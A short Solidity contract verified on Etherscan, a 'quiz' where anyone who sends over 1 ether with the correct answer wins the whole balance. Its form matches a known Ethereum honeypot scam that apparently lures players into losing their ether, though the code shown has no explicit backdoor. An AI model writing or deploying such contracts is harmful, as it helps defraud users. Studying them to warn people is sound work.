/**
 *Submitted for verification at Etherscan.io on 2022-04-10
*/

// SPDX-License-Identifier: GPL-2.0-or-later

pragma solidity >=0.7.0 <0.9.0;
/**
 *Submitted for verification at Etherscan.io on 2022-04-08
*/
/**
 *Submitted for verification at Etherscan.io on 2022-04-08
*/

contract I_AM_QUIZ
{
    function Try(string memory _response) public payable
    {
        require(msg.sender == tx.origin);

        if(responseHash == keccak256(abi.encode(_response)) && msg.value > 1 ether)
        {
            payable(msg.sender).transfer(address(this).balance);
        }
    }

    string public question;

    bytes32 public responseHash;
    function test(string memory _response) public view returns(bytes32) {
        return keccak256(abi.encode(_response));
    }
    mapping (bytes32=>bool) admin;

    function Start(string calldata _question, string calldata _response) public payable {
        if(responseHash==0x0){
            responseHash = keccak256(abi.encode(_response));
            question = _question;
        }
    }


    fallback() external {}
}